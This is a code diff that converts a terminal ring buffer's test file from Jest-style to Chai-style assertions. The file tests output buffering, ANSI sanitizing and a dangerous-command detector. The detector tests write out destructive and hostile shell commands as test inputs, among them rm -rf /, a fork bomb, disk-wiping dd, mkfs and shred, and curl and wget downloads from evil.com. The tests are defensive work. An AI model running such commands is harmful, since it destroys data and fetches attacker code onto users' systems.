@@ -14,6 +14,7 @@
 // SPDX-License-Identifier: EPL-2.0 OR GPL-2.0-only WITH Classpath-exception-2.0
 // *****************************************************************************
 
+import { expect } from 'chai';
 import { TerminalRingBuffer, sanitizeOutput, isDangerous, getDangerousPatterns } from '../terminal-ring-buffer';
 
 describe('TerminalRingBuffer', () => {
@@ -26,45 +27,45 @@ describe('TerminalRingBuffer', () => {
     describe('constructor', () => {
         it('should create buffer with default max lines', () => {
             const defaultBuffer = new TerminalRingBuffer();
-            expect(defaultBuffer.getMaxLines()).toBe(10000);
+            expect(defaultBuffer.getMaxLines()).to.equal(10000);
         });
 
         it('should create buffer with custom max lines', () => {
             const customBuffer = new TerminalRingBuffer(5000);
-            expect(customBuffer.getMaxLines()).toBe(5000);
+            expect(customBuffer.getMaxLines()).to.equal(5000);
         });
     });
 
     describe('append', () => {
         it('should append data to empty buffer', () => {
             buffer.append('term1', 'hello');
-            expect(buffer.read('term1', 10)).toContain('hello');
+            expect(buffer.read('term1', 10)).to.include('hello');
         });
 
         it('should handle multiline data', () => {
             buffer.append('term1', 'line1\nline2\nline3');
             const lines = buffer.read('term1', 10);
-            expect(lines).toHaveLength(3);
-            expect(lines[0]).toBe('line1');
-            expect(lines[1]).toBe('line2');
-            expect(lines[2]).toBe('line3');
+            expect(lines).to.have.lengthOf(3);
+            expect(lines[0]).to.equal('line1');
+            expect(lines[1]).to.equal('line2');
+            expect(lines[2]).to.equal('line3');
         });
 
         it('should append to existing data', () => {
             buffer.append('term1', 'first');
             buffer.append('term1', 'second');
             const lines = buffer.read('term1', 10);
-            expect(lines).toHaveLength(2);
-            expect(lines[0]).toBe('first');
-            expect(lines[1]).toBe('second');
+            expect(lines).to.have.lengthOf(2);
+            expect(lines[0]).to.equal('first');
+            expect(lines[1]).to.equal('second');
         });
 
         it('should maintain separate buffers per terminal', () => {
             buffer.append('term1', 'data1');
             buffer.append('term2', 'data2');
-            expect(buffer.read('term1', 10)).toContain('data1');
-            expect(buffer.read('term2', 10)).toContain('data2');
-            expect(buffer.read('term1', 10)).not.toContain('data2');
+            expect(buffer.read('term1', 10)).to.include('data1');
+            expect(buffer.read('term2', 10)).to.include('data2');
+            expect(buffer.read('term1', 10)).to.not.include('data2');
         });
     });
 
@@ -76,9 +77,9 @@ describe('TerminalRingBuffer', () => {
             }
             const lines = smallBuffer.read('term1', 20);
             // Should only have last 5 lines
-            expect(lines).toHaveLength(5);
-            expect(lines[0]).toBe('line5');
-            expect(lines[4]).toBe('line9');
+            expect(lines).to.have.lengthOf(5);
+            expect(lines[0]).to.equal('line5');
+            expect(lines[4]).to.equal('line9');
         });
 
         it('should keep most recent lines when trimming', () => {
@@ -90,12 +91,12 @@ describe('TerminalRingBuffer', () => {
             smallBuffer.append('term1', 'line5');
             
             const lines = smallBuffer.read('term1', 10);
-            expect(lines).toHaveLength(3);
-            expect(lines).not.toContain('line1');
-            expect(lines).not.toContain('line2');
-            expect(lines).toContain('line3');
-            expect(lines).toContain('line4');
-            expect(lines).toContain('line5');
+            expect(lines).to.have.lengthOf(3);
+            expect(lines).to.not.include('line1');
+            expect(lines).to.not.include('line2');
+            expect(lines).to.include('line3');
+            expect(lines).to.include('line4');
+            expect(lines).to.include('line5');
         });
     });
 
@@ -105,9 +106,9 @@ describe('TerminalRingBuffer', () => {
                 buffer.append('term1', `line${i}`);
             }
             const lines = buffer.read('term1');
-            expect(lines).toHaveLength(100);
-            expect(lines[0]).toBe('line50');
-            expect(lines[99]).toBe('line149');
+            expect(lines).to.have.lengthOf(100);
+            expect(lines[0]).to.equal('line50');
+            expect(lines[99]).to.equal('line149');
         });
 
         it('should return specified number of lines', () => {
@@ -115,14 +116,14 @@ describe('TerminalRingBuffer', () => {
                 buffer.append('term1', `line${i}`);
             }
             const lines = buffer.read('term1', 10);
-            expect(lines).toHaveLength(10);
-            expect(lines[0]).toBe('line40');
-            expect(lines[9]).toBe('line49');
+            expect(lines).to.have.lengthOf(10);
+            expect(lines[0]).to.equal('line40');
+            expect(lines[9]).to.equal('line49');
         });
 
         it('should return empty array for unknown terminal', () => {
             const lines = buffer.read('unknown', 10);
-            expect(lines).toHaveLength(0);
+            expect(lines).to.have.lengthOf(0);
         });
     });
 
@@ -130,12 +131,12 @@ describe('TerminalRingBuffer', () => {
         it('should return all lines in buffer', () => {
             buffer.append('term1', 'a\nb\nc');
             const lines = buffer.readAll('term1');
-            expect(lines).toHaveLength(3);
+            expect(lines).to.have.lengthOf(3);
         });
 
         it('should return empty array for unknown terminal', () => {
             const lines = buffer.readAll('unknown');
-            expect(lines).toHaveLength(0);
+            expect(lines).to.have.lengthOf(0);
         });
     });
 
@@ -144,8 +145,8 @@ describe('TerminalRingBuffer', () => {
             buffer.append('term1', 'data');
             buffer.append('term2', 'data');
             buffer.clear('term1');
-            expect(buffer.read('term1', 10)).toHaveLength(0);
-            expect(buffer.read('term2', 10)).toHaveLength(1);
+            expect(buffer.read('term1', 10)).to.have.lengthOf(0);
+            expect(buffer.read('term2', 10)).to.have.lengthOf(1);
         });
     });
 
@@ -154,34 +155,34 @@ describe('TerminalRingBuffer', () => {
             buffer.append('term1', 'data1');
             buffer.append('term2', 'data2');
             buffer.clearAll();
-            expect(buffer.read('term1', 10)).toHaveLength(0);
-            expect(buffer.read('term2', 10)).toHaveLength(0);
+            expect(buffer.read('term1', 10)).to.have.lengthOf(0);
+            expect(buffer.read('term2', 10)).to.have.lengthOf(0);
         });
     });
 
     describe('getLineCount', () => {
         it('should return correct line count', () => {
             buffer.append('term1', 'a\nb\nc');
-            expect(buffer.getLineCount('term1')).toBe(3);
+            expect(buffer.getLineCount('term1')).to.equal(3);
         });
 
         it('should return 0 for unknown terminal', () => {
-            expect(buffer.getLineCount('unknown')).toBe(0);
+            expect(buffer.getLineCount('unknown')).to.equal(0);
         });
     });
 
     describe('hasOutput', () => {
         it('should return true for terminal with output', () => {
             buffer.append('term1', 'data');
-            expect(buffer.hasOutput('term1')).toBe(true);
+            expect(buffer.hasOutput('term1')).to.equal(true);
         });
 
         it('should return false for empty terminal', () => {
-            expect(buffer.hasOutput('term1')).toBe(false);
+            expect(buffer.hasOutput('term1')).to.equal(false);
         });
 
         it('should return false for unknown terminal', () => {
-            expect(buffer.hasOutput('unknown')).toBe(false);
+            expect(buffer.hasOutput('unknown')).to.equal(false);
         });
     });
 
@@ -190,167 +191,167 @@ describe('TerminalRingBuffer', () => {
             buffer.append('term1', 'data');
             buffer.append('term2', 'data');
             const ids = buffer.getTerminalIds();
-            expect(ids).toContain('term1');
-            expect(ids).toContain('term2');
-            expect(ids).toHaveLength(2);
+            expect(ids).to.include('term1');
+            expect(ids).to.include('term2');
+            expect(ids).to.have.lengthOf(2);
         });
 
         it('should return empty array when empty', () => {
             const ids = buffer.getTerminalIds();
-            expect(ids).toHaveLength(0);
+            expect(ids).to.have.lengthOf(0);
         });
     });
 });
 
 describe('sanitizeOutput', () => {
     it('should return empty string for empty input', () => {
-        expect(sanitizeOutput('')).toBe('');
+        expect(sanitizeOutput('')).to.equal('');
     });
 
     it('should pass through plain text unchanged', () => {
-        expect(sanitizeOutput('hello world')).toBe('hello world');
+        expect(sanitizeOutput('hello world')).to.equal('hello world');
     });
 
     it('should remove ANSI color codes', () => {
         // \x1B[31m is red color code
-        expect(sanitizeOutput('\x1B[31mhello\x1B[0m')).toBe('hello');
+        expect(sanitizeOutput('\x1B[31mhello\x1B[0m')).to.equal('hello');
     });
 
     it('should remove ANSI escape sequences', () => {
         // \x1B[2J is clear screen
-        expect(sanitizeOutput('\x1B[2Jhello')).toBe('hello');
+        expect(sanitizeOutput('\x1B[2Jhello')).to.equal('hello');
     });
 
     it('should remove cursor movement sequences', () => {
         // \x1B[10;20H positions cursor
-        expect(sanitizeOutput('\x1B[10;20Hhello')).toBe('hello');
+        expect(sanitizeOutput('\x1B[10;20Hhello')).to.equal('hello');
     });
 
     it('should remove extended ANSI (true color)', () => {
         // \x1B[38;2;255;0;0m is RGB red
-        expect(sanitizeOutput('\x1B[38;2;255;0;0mhello\x1B[0m')).toBe('hello');
+        expect(sanitizeOutput('\x1B[38;2;255;0;0mhello\x1B[0m')).to.equal('hello');
     });
 
     it('should remove control characters but keep newlines and tabs', () => {
         // \x00 is NUL, \x07 is BEL, \x1F is unit separator
         const input = 'hello\x00world\x07test\x1Fdata';
         const output = sanitizeOutput(input);
-        expect(output).toBe('helloworldtestdata');
+        expect(output).to.equal('helloworldtestdata');
     });
 
     it('should preserve newlines and tabs', () => {
         const input = 'line1\nline2\twith\ttab';
-        expect(sanitizeOutput(input)).toBe(input);
+        expect(sanitizeOutput(input)).to.equal(input);
     });
 
     it('should handle real terminal output', () => {
         const realOutput = '\x1B]0;user@host:~\x07\x1B[32muser@host\x1B[0m:\x1B[34m~\x1B[0m$ echo hello\nhello';
         const sanitized = sanitizeOutput(realOutput);
-        expect(sanitized).toContain('user@host');
-        expect(sanitized).toContain('echo hello');
-        expect(sanitized).toContain('hello');
+        expect(sanitized).to.include('user@host');
+        expect(sanitized).to.include('echo hello');
+        expect(sanitized).to.include('hello');
     });
 });
 
 describe('isDangerous', () => {
     it('should return false for safe commands', () => {
-        expect(isDangerous('ls -la')).toBe(false);
-        expect(isDangerous('cd /home')).toBe(false);
-        expect(isDangerous('cat file.txt')).toBe(false);
-        expect(isDangerous('grep pattern file')).toBe(false);
-        expect(isDangerous('echo hello')).toBe(false);
+        expect(isDangerous('ls -la')).to.equal(false);
+        expect(isDangerous('cd /home')).to.equal(false);
+        expect(isDangerous('cat file.txt')).to.equal(false);
+        expect(isDangerous('grep pattern file')).to.equal(false);
+        expect(isDangerous('echo hello')).to.equal(false);
     });
 
     it('should detect rm -rf', () => {
-        expect(isDangerous('rm -rf /')).toBe(true);
-        expect(isDangerous('rm -rf /tmp/*')).toBe(true);
-        expect(isDangerous('rm -rf .')).toBe(true);
+        expect(isDangerous('rm -rf /')).to.equal(true);
+        expect(isDangerous('rm -rf /tmp/*')).to.equal(true);
+        expect(isDangerous('rm -rf .')).to.equal(true);
     });
 
     it('should detect rm recursive', () => {
-        expect(isDangerous('rm -r /home')).toBe(true);
-        expect(isDangerous('rm -r /var/log/*')).toBe(true);
+        expect(isDangerous('rm -r /home')).to.equal(true);
+        expect(isDangerous('rm -r /var/log/*')).to.equal(true);
     });
 
     it('should detect sudo', () => {
-        expect(isDangerous('sudo rm -rf /')).toBe(true);
-        expect(isDangerous('sudo apt-get install vim')).toBe(true);
-        expect(isDangerous('sudo -i')).toBe(true);
+        expect(isDangerous('sudo rm -rf /')).to.equal(true);
+        expect(isDangerous('sudo apt-get install vim')).to.equal(true);
+        expect(isDangerous('sudo -i')).to.equal(true);
     });
 
     it('should detect chmod 777', () => {
-        expect(isDangerous('chmod 777 /etc/passwd')).toBe(true);
-        expect(isDangerous('chmod 777 /home')).toBe(true);
+        expect(isDangerous('chmod 777 /etc/passwd')).to.equal(true);
+        expect(isDangerous('chmod 777 /home')).to.equal(true);
     });
 
     it('should detect chmod -R 777', () => {
-        expect(isDangerous('chmod -R 777 /home')).toBe(true);
+        expect(isDangerous('chmod -R 777 /home')).to.equal(true);
     });
 
     it('should detect fork bombs', () => {
-        expect(isDangerous(':(){:|:&};:')).toBe(true);
+        expect(isDangerous(':(){:|:&};:')).to.equal(true);
     });
 
     it('should detect dd commands', () => {
-        expect(isDangerous('dd if=/dev/zero of=/dev/sda')).toBe(true);
+        expect(isDangerous('dd if=/dev/zero of=/dev/sda')).to.equal(true);
     });
 
     it('should detect mkfs', () => {
-        expect(isDangerous('mkfs /dev/sda1')).toBe(true);
+        expect(isDangerous('mkfs /dev/sda1')).to.equal(true);
     });
 
     it('should detect wipefs', () => {
-        expect(isDangerous('wipefs -a /dev/sda')).toBe(true);
+        expect(isDangerous('wipefs -a /dev/sda')).to.equal(true);
     });
 
     it('should detect shred', () => {
-        expect(isDangerous('shred /dev/sda')).toBe(true);
+        expect(isDangerous('shred /dev/sda')).to.equal(true);
     });
 
     it('should detect curl to system path', () => {
-        expect(isDangerous('curl http://evil.com/script.sh > /tmp/evil.sh')).toBe(true);
+        expect(isDangerous('curl http://evil.com/script.sh > /tmp/evil.sh')).to.equal(true);
     });
 
     it('should detect wget to system path', () => {
-        expect(isDangerous('wget http://evil.com/script.sh -O /tmp/evil.sh')).toBe(true);
+        expect(isDangerous('wget http://evil.com/script.sh -O /tmp/evil.sh')).to.equal(true);
     });
 
     it('should detect shutdown commands', () => {
-        expect(isDangerous('shutdown -h now')).toBe(true);
-        expect(isDangerous('shutdown -r now')).toBe(true);
+        expect(isDangerous('shutdown -h now')).to.equal(true);
+        expect(isDangerous('shutdown -r now')).to.equal(true);
     });
 
     it('should detect reboot and halt', () => {
-        expect(isDangerous('reboot')).toBe(true);
-        expect(isDangerous('halt')).toBe(true);
-        expect(isDangerous('init 0')).toBe(true);
-        expect(isDangerous('init 6')).toBe(true);
+        expect(isDangerous('reboot')).to.equal(true);
+        expect(isDangerous('halt')).to.equal(true);
+        expect(isDangerous('init 0')).to.equal(true);
+        expect(isDangerous('init 6')).to.equal(true);
     });
 
     it('should handle commands with extra whitespace', () => {
-        expect(isDangerous('  rm   -rf   /  ')).toBe(true);
+        expect(isDangerous('  rm   -rf   /  ')).to.equal(true);
     });
 
     it('should return false for empty string', () => {
-        expect(isDangerous('')).toBe(false);
+        expect(isDangerous('')).to.equal(false);
     });
 
     it('should handle multiline input (check first line)', () => {
-        expect(isDangerous('rm -rf /\necho "not dangerous"')).toBe(true);
+        expect(isDangerous('rm -rf /\necho "not dangerous"')).to.equal(true);
     });
 });
 
 describe('getDangerousPatterns', () => {
     it('should return array of patterns', () => {
         const patterns = getDangerousPatterns();
-        expect(Array.isArray(patterns)).toBe(true);
-        expect(patterns.length).toBeGreaterThan(0);
+        expect(Array.isArray(patterns)).to.equal(true);
+        expect(patterns.length).to.be.greaterThan(0);
     });
 
     it('should all be RegExp instances', () => {
         const patterns = getDangerousPatterns();
         patterns.forEach(p => {
-            expect(p instanceof RegExp).toBe(true);
+            expect(p instanceof RegExp).to.equal(true);
         });
     });
 });
